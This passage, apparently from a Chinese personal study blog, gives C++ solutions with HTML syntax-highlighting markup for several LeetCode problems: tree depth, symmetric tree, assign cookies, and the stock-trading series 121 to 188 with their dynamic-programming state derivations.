TreeNode* node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">CreateTree</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode* root=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[<span class="number">0</span>]);</span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(num&lt;n)&#123;</span><br><span class="line">        TreeNode* top=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(top-&gt;left==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[num]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                top-&gt;left=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[num]);</span><br><span class="line">                q.<span class="built_in">push</span>(top-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num==n)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top-&gt;right==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[num]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                top-&gt;right=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[num]);</span><br><span class="line">                q.<span class="built_in">push</span>(top-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n); <span class="comment">// 7</span></span><br><span class="line">    <span class="keyword">int</span> a[n]; <span class="comment">// 3 9 20 -1 -1 15 7</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;  <span class="comment">// -1 represents NULL</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,a[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode* root=<span class="built_in">CreateTree</span>(a,n);</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,root-&gt;val);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,root-&gt;right-&gt;right-&gt;val);</span></span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">maxDepth</span>(root);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-101-对称二叉树-C"><a href="#leetcode-101-对称二叉树-C" class="headerlink" title="leetcode 101. 对称二叉树_C++"></a>leetcode 101. 对称二叉树_C++</h4><p>第一反应是懵的，看了一下官方题解，有个思路很重要</p>
<ol>
<li>它们的两个根结点具有相同的值。</li>
<li>每个树的右子树都与另一个树的左子树镜像对称</li>
</ol>
<p>什么我也能这么拆解题目就好了呢</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 101. 对称二叉树</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="keyword">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>), <span class="built_in">right</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isMirror</span><span class="params">(TreeNode* a,TreeNode* b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="literal">nullptr</span> &amp;&amp; b==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="literal">nullptr</span> || b==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> ((a-&gt;val == b-&gt;val)&amp;&amp; <span class="built_in">isMirror</span>(a-&gt;left, b-&gt;right)&amp;&amp; <span class="built_in">isMirror</span>(b-&gt;left, a-&gt;right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isMirror</span>(root-&gt;left,root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">newNode</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    TreeNode* node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">CreateTree</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode* root=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[<span class="number">0</span>]);</span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(num&lt;n)&#123;</span><br><span class="line">        TreeNode* top=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(top-&gt;left==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[num]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                top-&gt;left=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[num]);</span><br><span class="line">                q.<span class="built_in">push</span>(top-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num==n)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top-&gt;right==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[num]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                top-&gt;right=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[num]);</span><br><span class="line">                q.<span class="built_in">push</span>(top-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n); <span class="comment">// 7</span></span><br><span class="line">    <span class="keyword">int</span> a[n]; <span class="comment">// 1 2 2 3 4 4 3</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;  <span class="comment">// -1 represents NULL</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,a[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode* root=<span class="built_in">CreateTree</span>(a,n);</span><br><span class="line">    <span class="keyword">bool</span> ans=<span class="built_in">isSymmetric</span>(root);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-19-amp-amp-20"><a href="#2020-4-19-amp-amp-20" class="headerlink" title="2020/4/19 &amp;&amp; 20"></a>2020/4/19 &amp;&amp; 20</h3><h4 id="leetcode-455-分发饼干-C"><a href="#leetcode-455-分发饼干-C" class="headerlink" title="leetcode 455. 分发饼干_C++"></a>leetcode 455. 分发饼干_C++</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 455. 分发饼干</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; g, vector&lt;<span class="keyword">int</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">sort</span>(g.<span class="built_in">begin</span>(),g.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">int</span> gIndex=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(gIndex==g.<span class="built_in">size</span>()) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(g[gIndex]&lt;=s[i])&#123;</span><br><span class="line">            num++;</span><br><span class="line">            gIndex++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; g,s;</span><br><span class="line">    <span class="keyword">int</span> n,m; <span class="comment">// 3 2</span></span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123; <span class="comment">// 1 2 3</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        g.<span class="built_in">push_back</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123; <span class="comment">// 1 1</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        s.<span class="built_in">push_back</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">findContentChildren</span>(g,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-股票题C"><a href="#leetcode-股票题C" class="headerlink" title="leetcode 股票题C++"></a>leetcode 股票题C++</h4><p>通解，花里胡哨的情况有一堆，打算采用暴力枚举dp状态的方式想把所有的题目都做了，然后再改进</p>
<p>所有题目的状态无非就是三类，天数（n）；允许交易的最大次数（K）；是否持有股票（0/1）</p>
<p>总状态开一个三维的dp数组能应付一切情况</p>
<h5 id="leetcode-121-买卖股票的最佳时机-C"><a href="#leetcode-121-买卖股票的最佳时机-C" class="headerlink" title="leetcode 121. 买卖股票的最佳时机_C++"></a>leetcode 121. 买卖股票的最佳时机_C++</h5><p>K==1，这个状态对dp没有什么影响了，成功降维省空间</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 121. 买卖股票的最佳时机</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=prices.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">100000</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 处理边界</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>]=-prices[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i]);</span><br><span class="line">        dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],-prices[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n); <span class="comment">// 6</span></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; prices;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123; <span class="comment">// 7 1 5 3 6 4</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        prices.<span class="built_in">push_back</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">maxProfit</span>(prices);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="leetcode-122-买卖股票的最佳时机-II-C"><a href="#leetcode-122-买卖股票的最佳时机-II-C" class="headerlink" title="leetcode 122. 买卖股票的最佳时机 II_C++"></a>leetcode 122. 买卖股票的最佳时机 II_C++</h5><p>这次K变成了正无穷大</p>
<p>只展示maxProfit函数</p>
<p>我们推理一下状态转移公式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dp[i][k][0] = max(dp[i-1][k][0], dp[i-1][k][1] + prices[i])</span><br><span class="line">dp[i][k][1] = max(dp[i-1][k][1], dp[i-1][k-1][0] - prices[i])</span><br><span class="line">如果 k 为正无穷，那么就可以认为 k 和 k - 1 是一样的（很关键的一步）</span><br><span class="line">这样就可以再次降维，丢弃k的那个维度</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 122. 买卖股票的最佳时机 II</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit2</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=prices.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">100000</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 处理边界</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>]=-prices[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i]);</span><br><span class="line">        dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]-prices[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="leetcode-123-买卖股票的最佳时机-III-C"><a href="#leetcode-123-买卖股票的最佳时机-III-C" class="headerlink" title="leetcode 123. 买卖股票的最佳时机 III_C++"></a>leetcode 123. 买卖股票的最佳时机 III_C++</h5><p>仔细分析和上面的题目基本一样了，k为2</p>
<p>但是我实在是忍受不了0代表第一天了，就改了下下标</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 123. 买卖股票的最佳时机 III</span></span><br><span class="line"><span class="comment">// dp[i][j][k]表示第i天，进行了j次交易，当前状态为k时的最大利润</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit3</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">int</span> len=prices.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">100001</span>][<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 处理边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        dp[i][<span class="number">0</span>][<span class="number">1</span>]=-inf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>;i++)&#123;</span><br><span class="line">        dp[<span class="number">0</span>][i][<span class="number">0</span>]=-inf;</span><br><span class="line">        dp[<span class="number">0</span>][i][<span class="number">1</span>]=-inf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">2</span>;j++)&#123;</span><br><span class="line">            dp[i][j][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j][<span class="number">0</span>],dp[i<span class="number">-1</span>][j][<span class="number">1</span>]+prices[i<span class="number">-1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(j!=<span class="number">0</span>)</span><br><span class="line">                dp[i][j][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j][<span class="number">1</span>],dp[i<span class="number">-1</span>][j<span class="number">-1</span>][<span class="number">0</span>]-prices[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">max</span>(dp[len][<span class="number">0</span>][<span class="number">0</span>], dp[len][<span class="number">1</span>][<span class="number">0</span>]), dp[len][<span class="number">2</span>][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="leetcode-188-买卖股票的最佳时机IV-C"><a href="#leetcode-188-买卖股票的最佳时机IV-C" class="headerlink" title="leetcode 188. 买卖股票的最佳时机IV_C++"></a>leetcode 188. 买卖股票的最佳时机IV_C++</h5><p>这题只不过k变成了我们输入的值</p>
<p>然后做了一下发现出了个问题，样例中k可以为1000000000，我们直接开dp数组会超过可用的内存空间</p>
<p>所以我们需要对K&gt;len/2的情况单独讨论</p>
<p>那么K上限是无穷大，对于本次问题没有约束力了，那么我们直接降维即可</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 188. 买卖股票的最佳时机 IV</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> k, vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">int</span> len=prices.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(len&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> K=k;</span><br><span class="line">    <span class="keyword">if</span> (K&gt;len/<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> maxpro=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> dp2[len][<span class="number">2</span>];</span><br><span class="line">        dp2[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp2[<span class="number">0</span>][<span class="number">1</span>] = -prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp2[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp2[i - <span class="number">1</span>][<span class="number">0</span>], dp2[i - <span class="number">1</span>][<span class="number">1</span>] + prices[i]);</span><br><span class="line">            dp2[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp2[i - <span class="number">1</span>][<span class="number">1</span>], dp2[i - <span class="number">1</span>][<span class="number">0</span>] - prices[i]);</span><br><span class="line">            maxpro = <span class="built_in">max</span>(<span class="built_in">max</span>(dp2[i][<span class="number">0</span>], dp2[i][<span class="number">1</span>]), maxpro);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxpro;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> dp[len+<span class="number">1</span>][K+<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 处理边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        dp[i][<span class="number">0</span>][<span class="number">1</span>]=-inf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=K;i++)&#123;</span><br><span class="line">        dp[<span class="number">0</span>][i][<span class="number">0</span>]=-inf;</span><br><span class="line">        dp[<span class="number">0</span>][i][<span class="number">1</span>]=-inf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=K;j++)&#123;</span><br><span class="line">            dp[i][j][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j][<span class="number">0</span>],dp[i<span class="number">-1</span>][j][<span class="number">1</span>]+prices[i<span class="number">-1</span>]);</span><br><span class="line">            <span 